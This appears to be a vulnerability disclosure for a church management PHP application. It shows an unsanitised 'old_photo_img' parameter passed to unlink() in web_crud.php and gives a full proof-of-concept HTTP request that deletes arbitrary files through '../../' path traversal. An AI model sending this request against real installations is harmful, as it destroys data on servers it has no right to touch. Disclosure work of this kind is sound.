### Vulnerability file address

In line 251 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo_img']);`,` $_POST['old_photo_img']` parameters have not been restricted, which causes any file to be deleted

```php
 if (isset($_POST['update5'])) {
        function generateUniqueFilename($file)
        {
            $file_extension = pathinfo($file['name'], PATHINFO_EXTENSION);
            $unique_filename = uniqid() . '.' . $file_extension;
            return $unique_filename;
        }

        if ($_FILES['photo']['tmp_name'] != '') {
            $img = generateUniqueFilename($_FILES['photo']);
            $filepath = "../../assets/images/" . $img;

            if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 371

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update5"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo_img"

../../7.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `7.txt` file in the `church/` directory

![image-20250504211600479](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042116522.png)

Then we execute the above poc to attack

![image-20250504211658112](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042116141.png)

Files are deleted after the attack is successful

![image-20250504211648697](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042116738.png)